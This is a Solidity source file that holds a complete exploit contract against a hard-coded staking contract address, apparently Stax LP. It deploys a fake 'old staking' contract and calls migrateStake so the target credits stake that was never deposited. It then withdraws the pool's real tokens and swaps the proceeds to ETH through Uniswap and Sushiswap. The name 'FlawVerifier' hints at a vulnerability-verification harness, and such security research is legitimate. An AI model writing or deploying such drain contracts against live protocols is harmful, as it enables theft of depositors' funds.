// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IStaxLPStakingLike {
    function stakingToken() external view returns (address);
    function migrateStake(address oldStaking, uint256 amount) external;
    function withdraw(uint256 amount, bool claim) external;
}

contract FakeOldStaking {
    constructor() {}

    function migrateWithdraw(address, uint256) external {}
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToEth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            _ahTryUnwrapWeth();
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, bal);

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToWeth(token, AH_SUSHI, bal);
        }

        _ahTryUnwrapWeth();
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = AH_WETH;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTryUnwrapWeth() internal {
        uint256 wethBal = _ahBalanceOf(AH_WETH, address(this));
        if (wethBal == 0) return;
        (bool ok,) = AH_WETH.call(abi.encodeWithSelector(IAHWETH.withdraw.selector, wethBal));
        ok;
    }
}


contract FlawVerifier is __AHTokenToEthMixin {
    address public constant TARGET = 0xd2869042E12a3506100af1D192b5b04D65137941;

    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() public {
        address token = profitToken();
        uint256 balanceBefore = IERC20Like(token).balanceOf(address(this));

        uint256 amount = IERC20Like(token).balanceOf(TARGET);
        require(amount > 0, "no pool balance");

        // Exploit path stage 1:
        // Deploy an attacker-controlled fake old staking contract that exposes
        // migrateWithdraw(address,uint256) but never transfers any staking tokens.
        FakeOldStaking fakeOldStaking = new FakeOldStaking();

        // Exploit path stages 2-3:
        // Call migrateStake(fakeOldStaking, amount). The target trusts both the
        // attacker-supplied source contract and attacker-chosen amount, performs the
        // external call, and then credits the attacker via _applyStake without
        // verifying that any stakingToken was actually received.
        IStaxLPStakingLike(TARGET).migrateStake(address(fakeOldStaking), amount);

        // Exploit path stage 4:
        // Redeem the unbacked shares for real staking tokens already held by the pool.
        IStaxLPStakingLike(TARGET).withdraw(amount, false);

        uint256 balanceAfter = IERC20Like(token).balanceOf(address(this));
        require(balanceAfter > balanceBefore, "no profit");
        _profitAmount = balanceAfter - balanceBefore;
        _ahFinalizeTokenToEth();
    }

    function profitToken() public view returns (address) {
        return IStaxLPStakingLike(TARGET).stakingToken();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHWETH {
    function withdraw(uint256 amount) external;
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
